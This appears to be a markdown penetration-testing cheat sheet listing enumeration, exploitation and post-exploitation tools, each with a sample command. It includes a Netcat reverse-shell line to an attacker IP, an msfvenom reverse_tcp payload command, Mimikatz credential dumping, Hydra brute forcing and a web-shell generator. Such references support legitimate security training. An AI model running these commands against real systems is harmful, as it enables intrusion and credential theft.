# Tools

## Enumeration Tools

These tools are essential for gathering information about the target system, such as open ports, services, and potential vulnerabilities.

- **[Nmap](https://nmap.org/)**: A powerful network scanning tool used to discover hosts, services, and vulnerabilities.
  - Command: `nmap -sC -sV -oA scan_results <target_ip>`
  
- **[Nikto](https://cirt.net/Nikto2)**: A web server scanner that identifies various vulnerabilities like outdated software, security misconfigurations, and common web server issues.
  - Command: `nikto -h <target_ip>`

- **[DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)/[Dirsearch](https://github.com/maurosoria/dirsearch)**: Tools used to perform directory and file brute-forcing on web servers.
  - Command: `dirb http://<target_ip>/`

- **[Gobuster](https://github.com/OJ/gobuster)**: A tool for directory and DNS busting, often used for finding hidden directories or subdomains.
  - Command: `gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt`

- **[Enum4linux](https://github.com/CiscoCXSecurity/enum4linux)**: A Linux tool used to gather information from Windows machines using SMB.
  - Command: `enum4linux -a <target_ip>`

- **[SMBclient](https://linux.die.net/man/1/smbclient)**: A client for accessing shared folders on Windows machines via SMB.
  - Command: `smbclient //target_ip/share -U username`

- **[Netcat](https://nmap.org/ncat/)**: A versatile networking tool used for connecting to remote systems and debugging or scanning networks.
  - Command: `nc -lvp 4444` (for listening on a local port)

- **[Netdiscover](https://github.com/alexxy/netdiscover)**: A tool for discovering hosts in a local network via ARP requests.
  - Command: `netdiscover -r 192.168.1.0/24`

- **[WhatWeb](https://github.com/urbanadventurer/WhatWeb)**: A web application fingerprinting tool to identify technologies and services in use on web servers.
  - Command: `whatweb <target_ip>`

## Exploitation Tools

These tools are used for exploiting known vulnerabilities or misconfigurations in systems and applications.

- **[Metasploit Framework](https://www.metasploit.com/)**: A powerful exploitation framework used for automating the process of exploiting vulnerabilities.
  - Command: `msfconsole`

- **[SQLmap](http://sqlmap.org/)**: A tool for automating SQL injection and database takeover.
  - Command: `sqlmap -u "http://<target_ip>/page?id=1" --dbs`

- **[Hydra](https://github.com/vanhauser-thc/thc-hydra)**: A tool used for brute-force attacks against services like SSH, FTP, HTTP, and more.
  - Command: `hydra -l <username> -P <password_list> ssh://<target_ip>`

- **[John the Ripper](https://www.openwall.com/john/)**: A password cracking tool used to break hashes from various services (including Linux, Windows, and more).
  - Command: `john --wordlist=<password_list> <hash_file>`

- **[Mimikatz](https://github.com/gentilkiwi/mimikatz)**: A tool for extracting passwords and other credentials from Windows systems, including Kerberos tickets and clear-text passwords.
  - Command: `mimikatz.exe sekurlsa::logonPasswords`

- **[MSFvenom](https://www.metasploit.com/)**: A part of the Metasploit framework used to generate payloads for various platforms.
  - Command: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe > payload.exe`

- **[Responder](https://github.com/SpiderLabs/Responder)**: A tool used to poison network traffic and capture login credentials via LLMNR, NBT-NS, and DNS poisoning.
  - Command: `responder -I eth0`

- **[Empire](https://github.com/EmpireProject/Empire)**: A post-exploitation framework that includes PowerShell agents for lateral movement and persistence.
  - Command: `python2 empire`

- **[BeEF (Browser Exploitation Framework)](https://github.com/beefproject/beef)**: A tool used to launch attacks from the browser context by exploiting vulnerabilities in web applications.
  - Command: `./beef`

## Post-Exploitation Tools

These tools are used after successful exploitation to maintain persistence, escalate privileges, and gather further information from compromised systems.

- **[Netcat](https://nmap.org/ncat/)**: Can also be used during post-exploitation for creating reverse shells and tunneling data.
  - Command: `nc -e /bin/bash <attacker_ip> <port>`

- **[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)**: A collection of PowerShell scripts for post-exploitation activities, including privilege escalation, credential dumping, and more.
  - Command: `import-module PowerSploit`

- **[Weevely](https://github.com/epinna/weevely3)**: A web shell that allows remote access and manipulation of compromised web servers.
  - Command: `weevely generate <password> <webshell_location>`

- **[Powershell Empire](https://github.com/EmpireProject/Empire)**: A post-exploitation tool using PowerShell for pivoting, credential harvesting, and data exfiltration.
  - Command: `python2 empire`

- **[TheFatRat](https://github.com/Screetsec/TheFatRat)**: A tool for creating various types of malicious payloads, which can include reverse shells, Trojans, and more.
  - Command: `./setup.sh`

- **[Chisel](https://github.com/jpillora/chisel)**: A fast TCP/UDP tunnel over HTTP, useful for tunneling traffic through firewalls.
  - Command: `./chisel client <target_ip>:<port> <local_port>:<remote_port>`

- **[PrivescCheck](https://github.com/itm4n/PrivescCheck)**: A tool for checking possible privilege escalation vectors on Windows systems.
  - Command: `PrivescCheck.exe`

- **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**: A Linux privilege escalation script that checks for common misconfigurations and vulnerabilities.
  - Command: `./linpeas.sh`

- **[LinEnum](https://github.com/rebootuser/LinEnum)**: A script that automates the process of enumerating system information and potential privilege escalation vectors in Linux environments.
  - Command: `./linenum.sh`
